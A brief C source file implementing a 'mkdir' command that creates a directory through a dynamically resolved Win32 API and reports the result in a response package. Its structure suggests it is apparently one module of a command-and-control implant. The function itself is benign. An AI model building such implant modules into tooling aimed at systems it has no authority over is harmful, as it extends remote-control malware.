#include "config.h"
#ifdef INCLUDE_CMD_MKDIR

#include "commands.h"

VOID cmd_mkdir(PINSTANCE inst, PPARSER args, PPACKAGE response) {
    DWORD path_len = 0;
    char* path = parser_string(args, &path_len);
    if (!path || path_len == 0) {
        package_add_string(inst, response, XSTR("Usage: mkdir <path>"));
        response->is_error = TRUE;
        return;
    }

    char pathbuf[MAX_PATH] = {0};
    es_memcpy(pathbuf, path, path_len < MAX_PATH-1 ? path_len : MAX_PATH-1);

    if (inst->Win32.CreateDirectoryA(pathbuf, NULL)) {
        package_add_string(inst, response, XSTR("Directory created"));
    } else {
        package_add_string(inst, response, XSTR("Failed to create directory"));
        response->is_error = TRUE;
    }
}

#endif
